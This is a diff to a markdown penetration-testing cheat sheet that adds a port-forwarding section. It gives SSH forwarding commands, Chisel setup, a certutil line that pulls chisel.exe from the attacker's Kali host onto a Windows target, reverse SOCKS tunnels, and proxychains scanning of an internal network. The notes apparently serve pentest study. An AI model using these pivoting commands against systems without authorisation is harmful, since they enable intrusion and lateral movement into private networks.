@@ -338,11 +338,72 @@ ftp -A $KALI
 ftp> get $FILENAME
 ```
 
-## 5. Port forwarding
+## 5. [Port forwarding](/port-forwarding.md)
 
 ### 5.1. SSH port forwarding
 
-### 5.2. Chisel
+|   |   |
+|---|---|
+|Local (static)|`ssh -L 0.0.0.0:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET $USERNAME@$TARGET`|
+|Local (dynamic)|`ssh -L 0.0.0.0:$PORT_ON_KALI $USERNAME@$TARGET`|
+|Remote (static)|`ssh -R 0.0.0.0:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET root@$KALI`|
+|Remote (dynamic)|`ssh -R 0.0.0.0:$PORT_ON_KALI root@$KALI`|
+
+### 5.2. [Chisel](https://github.com/jpillora/chisel)
+
+<details>
+  <summary>Preparing chisel binaries:</summary>
+
+Prepare server on Kali:
+
+```console
+curl -LO https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_1.7.7_linux_amd64 chisel
+chmod +x chisel
+```
+
+Prepare client binaries for Windows target to download
+
+```console
+curl -LO https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
+gzip -d chisel_1.7.7_windows_amd64.gz
+mv chisel_1.7.7_windows_amd64 /var/www/html/chisel.exe
+```
+
+Download client binaries on Windows target
+
+```console
+certutil.exe -urlcache -f -split http://$KALI/chisel.exe %TEMP%\chisel.exe
+```
+
+</details>
+
+|   |   |
+|---|---|
+|Server setup|`chisel server --reverse --port 8080`|
+|Reverse static|`chisel client $KALI R:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET`|
+|Reverse dynamic|`chisel client $KALI R:socks`|
+
+## 5.3. Proxy Chains
+
+<details>
+  <summary>Config: <code>/etc/proxychains4.conf</code></summary>
+
+```console
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 9050
+socks5  $KALI 1080
+```
+
+</details>
+
+```console
+proxychains nmap -p- -A $TARGET_INTERNAL_NETWORK
+```
 
 ## 6. Linux privilege escalation
 
